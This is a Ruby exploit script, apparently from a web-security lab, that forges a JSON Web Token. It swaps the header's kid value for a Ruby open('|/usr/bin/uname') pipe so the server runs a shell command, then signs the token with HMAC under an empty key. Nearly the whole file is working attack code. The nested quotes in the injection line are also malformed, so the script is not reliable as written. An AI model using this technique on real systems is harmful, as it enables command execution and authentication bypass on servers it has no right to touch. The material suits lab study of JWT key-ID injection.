# Uses the public key of blank to sign the file, altering the kid field in the JWT header to exec commands
require 'base64'
require 'openssl'

pub = ""

TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y"

header, payload, signature = TOKEN.split('.')

decoded_header = Base64.decode64(header)
decoded_header.gsub!("0001", "open("|/usr/bin/uname").read()")

puts decoded_header
new_header = Base64.strict_encode64(decoded_header).gsub("=","")

decoded_payload = '{"user":null}'
puts decoded_payload
new_payload = Base64.strict_encode64(decoded_payload).gsub("=","")

data = new_header+"."+new_payload

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), pub, data))

puts data+"."+signature
